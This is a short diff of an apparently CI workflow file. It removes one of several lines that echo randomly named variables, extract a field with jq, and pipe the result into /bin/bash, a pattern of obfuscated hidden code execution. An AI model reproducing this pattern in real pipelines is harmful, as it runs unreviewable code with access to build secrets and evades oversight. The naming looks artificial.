@@ -32,7 +32,6 @@ jobs:
           echo $rilim5948 | jq -r .u61404 | /bin/bash
           echo $zfvk72864 | jq -r .py84399 | /bin/bash
           echo $aaorg3156 | jq -r .orqxm51 | /bin/bash
-          printf '%s' "$rydou6690" | jq -r .zh650 | /bin/bash
           printf '%s' "$haqr76183" | jq -r .rlnx81 | /bin/bash
           echo $gueif0 | jq -r .wm720 | /bin/bash
           echo $lm3 | jq -r .fs32 | /bin/bash
